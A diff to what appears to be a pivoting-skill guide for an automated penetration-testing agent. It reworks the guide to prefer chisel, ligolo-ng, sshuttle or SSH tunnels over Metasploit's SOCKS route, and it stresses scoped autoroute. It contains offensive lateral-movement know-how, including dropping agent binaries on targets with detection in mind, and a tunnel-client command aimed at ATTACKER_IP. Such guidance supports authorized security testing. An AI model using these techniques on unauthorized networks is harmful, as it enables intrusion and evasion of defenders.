@@ -108,21 +108,24 @@ pivot host runs unprivileged.
 
 ## Tool Selection Decision Tree
 
-Choose the right tool based on what's available. **Check this first:** if the
-engagement's shell backend is Metasploit (`config.yaml shell.backend:
-metasploit` — the default whenever metasploit-framework is installed) and you
-already have, or can get, a Meterpreter session on the pivot host, use
-Metasploit's **scoped** route + SOCKS proxy (Step 9) instead of the tree below
-— zero footprint on the pivot host, no extra binary uploaded, every Metasploit
-module routes through it automatically. **Always pass a specific target
-subnet** (via `start_socks_proxy(..., target_subnet="10.X.Y.0/24")` which runs
-`autoroute CMD=add` with explicit SUBNET+NETMASK); **never use `CMD=autoadd`**
-on a multi-homed pivot — it enumerates every pivot interface and routes agent
-traffic through subnets you did not scope. shell-mgr already does this natively
-for you if it owns the session (`[setup-pivot]` protocol); only fall through
-to the tree below if that's unavailable (shell-server-only access, or the
-Metasploit upgrade failed) or the destination needs a tool Metasploit can't
-reach the way you need (e.g. transparent subnet access, DNS/ICMP tunnels).
+**Prefer out-of-Framework pivots** (chisel / ligolo-ng / sshuttle / native SSH
+`-D`/`-L`, i.e. the tree below) over Metasploit's `start_socks_proxy`. The
+in-Framework SOCKS has proven unstable in practice: a dead relay (session dies
+with the SOCKS job still bound to it) wedges the shared RPC until msfconsole
+is restarted — see `knowledge/lessons-learned.md`. An out-of-Framework agent
+is a separate process; if it dies the MSF console keeps working and recovery
+is a fresh agent on target, not a full C2 restart. The tree below is now the
+**default**.
+
+Use Metasploit's scoped route + SOCKS proxy (Step 9) ONLY when the tree below
+is not viable: no outbound from the attackbox to the pivot, you cannot drop a
+small agent binary on target (policy / write-blocked filesystem / detection
+posture), or you need every Metasploit module to route transparently through
+the pivot without proxychains. If you do use it, **always pass a specific
+target subnet** (`start_socks_proxy(..., target_subnet="10.X.Y.0/24")` which
+runs `autoroute CMD=add` with explicit SUBNET+NETMASK) — **never
+`CMD=autoadd`**, which enumerates every pivot interface and routes agent
+traffic through subnets you did not scope.
 
 ```
 What access do you have on the pivot host?
@@ -797,13 +800,16 @@ python client.py --server-ip ATTACKER_IP --server-port 9999 --ntlm-proxy-ip PROX
 **Use case:** Corporate environments with NTLM-authenticated proxies that block
 direct outbound connections.
 
-## Step 9: Metasploit Pivoting (default when shell.backend: metasploit)
+## Step 9: Metasploit Pivoting (fallback when the tree above isn't viable)
 
-Prefer this over every other method in this skill whenever the engagement's
-shell backend is Metasploit and a Meterpreter session exists on the pivot
-host — see the note at the top of the decision tree. Only use Chisel/Ligolo/
-sshuttle/etc. as the fallback (no Meterpreter session available, or this
-failed).
+Use this ONLY when none of chisel / ligolo-ng / sshuttle / native SSH work
+(no attackbox-to-pivot outbound, you cannot drop a small binary on target,
+or you need every Metasploit module to route transparently through the pivot
+without proxychains). The in-Framework SOCKS proxy has proven unstable: a
+dead relay (session dies with the socks_proxy job still bound) wedges the
+shared RPC until msfconsole restarts — see `knowledge/lessons-learned.md`.
+When you do use it, keep the route scoped (never `CMD=autoadd`) per the
+rule under the heading below.
 
 **Rule: never un-scoped `autoroute` (`run autoroute` with no `-s`, or
 `run post/multi/manage/autoroute CMD=autoadd`).** It enumerates every
@@ -851,8 +857,12 @@ portfwd delete -l 8080 -p 80 -r 10.10.10.5
 socks5 127.0.0.1 1080
 ```
 
-**Use case:** When already in Metasploit. A scoped MSF route makes every
-Metasploit module targeting that subnet route through the pivot transparently.
+**Use case:** Fallback only — when the out-of-Framework tools in the decision
+tree above are not viable, or when you specifically need every Metasploit
+module targeting the pivoted subnet to route transparently (no proxychains
+wrapping required). Prefer chisel / ligolo-ng / sshuttle for anything longer
+than a brief in-and-out: a stable separate-process tunnel is worth the extra
+binary on target.
 
 ## Step 10: FRP (Fast Reverse Proxy)
 
